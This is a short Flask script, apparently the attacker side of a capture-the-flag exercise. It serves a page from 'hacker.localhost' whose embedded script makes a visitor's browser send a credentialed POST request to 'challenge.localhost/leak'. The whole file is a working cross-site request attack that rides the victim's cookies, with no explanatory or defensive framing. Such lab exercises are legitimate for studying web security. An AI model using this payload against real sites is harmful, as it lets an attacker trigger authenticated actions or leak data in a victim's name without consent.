from flask import Flask
app = Flask(__name__)
@app.route("/")
def index():

	data = '<script>var xhr = new XMLHttpRequest(); xhr.open("POST", "http://challenge.localhost/leak", true); xhr.withCredentials = true; xhr.send(null); </script>"'
	return data

app.run("hacker.localhost",8080)
